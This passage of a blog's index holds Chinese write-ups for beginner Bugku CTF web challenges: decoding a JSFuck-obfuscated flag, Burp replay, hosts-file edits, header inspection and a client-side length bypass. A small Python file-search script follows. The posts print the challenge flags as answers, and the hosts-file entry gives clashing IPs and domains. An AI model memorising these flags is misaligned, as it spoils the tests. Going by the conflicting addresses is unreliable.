    <content type="text"><![CDATA[WEB5链接：http://123.206.87.240:8002/web5/ 打开题目JSPFUCK??????答案格式CTF{**} ** ​ Submit 提示了你，按下Submit键返回flag值 这种题目先查看源代码因为没有别的提示F12或者右击查看元素，代码如下 12345&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;div style="display:none;"&gt;([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+(+(!+[]+!+[]+!+[]+[!+[]+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]])+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]])&lt;/div&gt;&lt;form method="post" action="index.php"&gt; 一脸懵，但是题目提示你是JSP，把他放入控制台直接进行解码获取到flag值 1ctf&#123;whatfk&#125; 要求大写 1CTF&#123;WHATFK&#125;]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2F%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B%2F</url>
    <content type="text"><![CDATA[你必须让他停下题目连接：http://123.206.87.240:8002/web12/ 进入题目页面不停刷新，会出现一张图片 两种方法： 1.Burp抓包 2.不停进行页面源码查看（不推荐） 先说第一种方法 1.先设置好代理，进行抓包 2.可以一直Forward（丢包），直到flag出现 3.给Repeater（中继器）一直进行（Go）尝试，直到得到flag值&amp; 123456789101112131415161718192021222324252627HTTP/1.1 200 OKServer: nginxDate: Wed, 02 Jan 2019 02:25:08 GMTContent-Type: text/htmlConnection: closeContent-Length: 630ï»¿&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;&lt;meta name="description" content=""&gt;&lt;meta name="author" content=""&gt;&lt;title&gt;Dummy game&lt;/title&gt;&lt;/head&gt;&lt;script language="JavaScript"&gt;function myrefresh()&#123;window.location.reload();&#125;setTimeout('myrefresh()',500); &lt;/script&gt;&lt;body&gt;&lt;center&gt;&lt;strong&gt;I want to play Dummy game with othersÂ£Â¡But I can't stop!&lt;/strong&gt;&lt;/center&gt;&lt;center&gt;Stop at panda ! u will get flag&lt;/center&gt;&lt;center&gt;&lt;div&gt;&lt;img src="10.jpg"/&gt;&lt;/div&gt;&lt;/center&gt;&lt;br&gt;&lt;a style="display:none"&gt;flag&#123;dummy_game_1s_s0_popular&#125;&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2F%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[域名解析题目听说把 flag.baidu.com 解析到123.206.87.240 就能拿到flag 域名可以直接访问，hosts文件 host文件 12这个文件是根据TCP/IP for Windows 的标准来工作的。它的作用是定义IP地址类似于HTML网站的index.php首页功能 有两种方法1.windos下改host文件 123我们修改本机的hosts文件。（修改时先以管理者运行记事本，再由记事本打开hosts文件，添加映射） hosts路径：`C:\Windows\System32\drivers\etc\hosts` 添加映射：`120.24.86.145 flag.bugku.com` 访问flag.bugku.com ，得到flag值 2.Linux下sudo命令 在linux下域名解析，修改/etc/hosts文件：1sudo gedit /etc/hosts 添加内容 1111.67.197.3 flag.bugku.com 保存之后，再在浏览器里打开flag.bugku.com就能看到flag。]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2F%E5%A4%B4%E7%AD%89%E8%88%B1%C2%B7%2F</url>
    <content type="text"><![CDATA[头等舱链接：http://123.206.87.240:9009/hd.php 进入题目 只有一个什么都没有 查看源码，也是一样 既然是WEB题，直接用Burp工具 1.设置好代理 2.进行抓包，交接给中继器（Repeater） 3.点击GO获得flag值 1234567891011121314HTTP/1.1 200 OKServer: nginxDate: Wed, 02 Jan 2019 08:27:10 GMTContent-Type: text/htmlConnection: closeflag&#123;Bugku_k8_23s_istra&#125;: Content-Length: 139&lt;html&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;&lt;pre&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;ä»ä¹ä¹æ²¡æã&lt;br&gt;&lt;br&gt;&lt;/html&gt;]]></content>
  </entry>
  <entry>
    <title><![CDATA[计算器--bugku]]></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2F2.%E8%AE%A1%E7%AE%97%E5%99%A8%2F</url>
    <content type="text"><![CDATA[# 2.计算器1.题目连接http://123.206.87.240:8002/yanzhengma/ 让你计算一道数学题例如： 95+35=？，但是只能输入一个数字，查看源码 1234567891011 &lt;span id="code" class="nocode"&gt;验证码&lt;/span&gt; &lt;input type="text" class="input" maxlength="1"/&gt; &lt;button id="check"&gt;验证&lt;/button&gt; &lt;div style="text-align:center;"&gt;&lt;p&gt;来源:&lt;a href="http://ctf.bugku.com/" target="_blank"&gt;BugKu-ctf&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&lt;/body&gt; &lt;script src="js/jquery-1.12.3.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/code.js"&gt;&lt;/script&gt; &lt;/html&gt; 主要看这一行 1&lt;span id="code" class="nocode"&gt;验证码&lt;/span&gt; &lt;input type="text" class="input" maxlength="1"/&gt; maxlength 属性规定输入字段的最大长度，以字符个数计。 maxlength 属性与 或 配合使用。 type:属性 因为将字符串定义成了1，所以输入的字符串无法大于1，将此处修改大于你要计算的数值即可]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WEB题--bugku]]></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2F1.WEB2%2F</url>
    <content type="text"><![CDATA[WEB题–bugku1.WEB2第一题为签到题，主要进入有一组滑稽笑脸 题目连接http://123.206.87.240:8002/web2/ 121.使用F12查看源代码即可找到flag值flag KEY&#123;Web-2-bugKssNNikls9100&#125; 12.查看JS文件 13.找GET请求响应 1234567&lt;/head&gt;&lt;body id="body" onLoad="init()"&gt;&lt;!flag KEY&#123;Web-2-bugKssNNikls9100&#125;&gt;&lt;script type="text/javascript" src="js/ThreeCanvas.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/Snow.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python辅助脚本集合]]></title>
    <url>%2F2019%2F06%2F03%2F%E4%B8%80%E4%BA%9B%E8%BE%85%E5%8A%A9%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[Python辅助脚本集合1.查找windows盘符文件（自用）123456789101112131415import osdef search(path,filename): path1 = [] for root, dirs, files in os.walk(path): if filename in dirs or filename in files: root = str(root) return os.path.join(root,filename) else: return Falsepanfu = input('请输入文件所在盘符:')name = input('请输入文件全名:')print('正在查找中...')lujing = search(panfu+':/', name)print('目标文件具体位置为：', lujing)os.system("pause") 打印结果 123请输入文件全名:kali2019正在查找中文件具体位置: E:/镜像（2）\kali2019]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第2章 Python必须知道的基础语法--数据类型]]></title>
    <url>%2F2019%2F06%2F03%2F%E7%AC%AC2%E7%AB%A0%20Python%E5%BF%85%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95--%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%2F</url>
